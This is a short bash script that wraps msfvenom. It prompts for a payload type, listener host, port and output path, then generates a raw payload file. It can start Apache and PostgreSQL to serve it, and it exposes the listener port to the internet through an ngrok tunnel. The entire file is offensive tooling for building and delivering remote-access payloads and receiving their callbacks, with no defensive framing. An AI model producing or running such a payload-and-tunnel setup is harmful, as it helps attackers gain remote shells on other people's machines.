#/bin/bash
echo "\e[31m[*] \e[96mEnter Auxilary:\e[5m_\e[0m"
read AUX
echo "\e[31m[*] \e[96mEnter Local Host:\e[5m_\e[0m"
read LHO
echo "\e[31m[*] \e[96mEnter Port:\e[5m_\e[0m"
read LPO
echo "\e[31m[*] \e[96mEnter File_Name.File_Format:\e[5m_\e[0m"
read FIL
echo "\e[31m[*] \e[96mWhere to Save:\e[5m_\e[0m"
read sav
echo "\n\t\t\e[31m[*]\e[96mAuxilary:\e[41m\t\e[5m\e[30m$AUX\e[0m" 
echo "\t\t\e[31m[*]\e[96mLocal Host:\e[41m\t\e[5m\e[30m$LHO\e[0m" 
echo "\t\t\e[31m[*]\e[96mPort:\e[41m\t\e[5m\e[30m$LPO\e[0m"
echo "\t\t\e[31m[*]\e[96mFile_Name:\e[41m\t\e[5m\e[30m$FIL\e[0m" 
echo "\t\t\e[31m[*]\e[96mSaved:\e[41m\t\e[5m\e[30m$sav\e[0m"
echo "\n \n \n\e[31m[*]\e[96mStarting to Create Payload in 5 Seconds:\e[0m"
sleep 5
echo "\e[31m[*]\e[96mCreating Payload:\e[5m_\e[0m"
msfvenom -p $AUX LHOST=$LHO LPORT=$LPO R >$sav$FIL
echo "\e[31m[*]\e[96mShall I Start Apache Server & Postgresql :1/0(Yes/No)\e[5m_\e[0m"
read Y
if [ $Y -eq 1 ]
then
{
echo "\e[31m[*]\e[96mStarting Apache2 Web Serever in 5 Seconds:\e[5m_\e[0m"
sleep 5
service apache2 start
echo "\e[31m[*]\e[96mStarting Postgresql Database in 5 Seconds:\e[5m_\e[0m"
sleep 5
service postgresql start
}
else
{
echo "\e[31m[*]\e[96mYou Declined..![X]\e[5m_\e[0m"
}
fi
echo "\e[31m[*]\e[96mEnter tcp/http for Ngrok :\e[5m_\e[0m"
read CON
echo "\e[31m[*]\e[96mTunneling $CON $LHO:$LPO Using Ngrok in 5 Seconds:\e[5m_\e[0m"
sleep 5
ngrok $CON $LHO:$LPO
